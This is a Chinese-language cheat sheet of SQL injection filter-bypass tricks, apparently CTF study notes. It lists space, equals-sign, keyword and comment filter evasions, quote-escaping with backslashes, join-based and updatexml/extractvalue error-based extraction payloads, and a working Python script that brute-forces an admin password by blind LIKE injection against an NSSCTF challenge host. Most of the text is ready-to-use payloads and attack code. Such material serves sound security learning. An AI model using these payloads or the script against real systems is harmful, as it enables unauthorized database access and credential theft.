## 分隔符：

```
当空格被服务器过滤时，可以将空格换成/**/
可替代：%0a、%0b(垂直制表符)、%0c(换页符)、%0d、%09、%a0（&nbsp）和/\*\*/、括号等
select(user())from dual where 1=1 and 2=2;可以变成
select(user())from dual where(1=1)and(2=2)
(还未遇到)
```

## 等号

```
用like绕过

直接替换即可,常见爆破：

import requests,time
alp = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~"
def get_pass():
    url = "http://node4.anna.nssctf.cn:28953/?source"
    flag = ""
    while True:
        for i in alp:
            data={"username":"admin","password":f"1'or/**/password/**/like/**/'{flag+i}%'#"}
            resp = requests.post(url=url,data=data)
            time.sleep(0.1)
            if "something wrong" not in resp.text:
                flag+=i
                print(flag)
                break
            elif "~" in i:
                return
get_pass()
```

## 一般的双写绕过、大小写绕过

## 关键词绕过

```
例如 \bselect\b 可以用/*!50000select*/绕过

**当column，union被过滤时：
可以使用join绕，join的意思为“连接”，连接的主要作用是根据两个或多个表中的列之间的关系，获取存在于不同表中的数据

所以我们用以下语句，使表中出现相同的字段名，出现报错，利用join把表扩充成两份，在最后查询别名c的时候 查询到重复字段，就成功报错
(select * from (select * from test as a join test as b) as c)//as可以不用，test为
(select * from (select * from test a join test b) c)

**当database被过滤时：
可以使用以下语句
tt=1' -a()#
tt=1' ||(select *from a)#
```

## 注释被过滤

```
可用 ,'2 绕过
可用 ||'2 绕过

当#被过滤，也可以试试%23
```

## 逃逸单引号或双引号可以构造a\

## 逻辑运算符

```
and  or  =  >  <  regexp  
&&  ||  like  greatest  least
```

## 闭合

```
在username与password中

可以用admin\\ 把引号给转义了
```

## 长度限制

当sql限制回显长度时，可以采用substr()，left等函数来

例：

```
?id=1%27 and updatexml(1, concat(0x7e,(select right(flag,30) from test_tb)),0x7e)--+

-1'||extractvalue(1,concat(0x7e,mid((select data from output),20)))#
```

